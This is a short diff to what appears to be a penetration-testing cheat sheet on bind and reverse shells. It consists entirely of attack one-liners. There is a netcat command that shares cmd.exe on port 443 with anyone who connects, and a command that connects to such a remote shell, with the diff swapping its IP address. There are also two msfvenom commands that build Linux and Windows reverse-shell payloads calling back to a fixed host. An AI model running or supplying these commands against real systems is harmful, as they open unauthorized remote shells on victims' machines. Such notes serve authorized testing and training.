@@ -1,6 +1,6 @@
 Bind
 nc -nlvp 443 -e cmd.exe    ..Windows: Share cmd (to anyone)
-nc -nv 10.0.0.88 443      ..Linux: Connect to remote cmd
+nc -nv 192.168.200.5 443      ..Linux: Connect to remote cmd
 
 msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.162.46 LPORT=4443 -f elf > shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -f exe > shell.exe
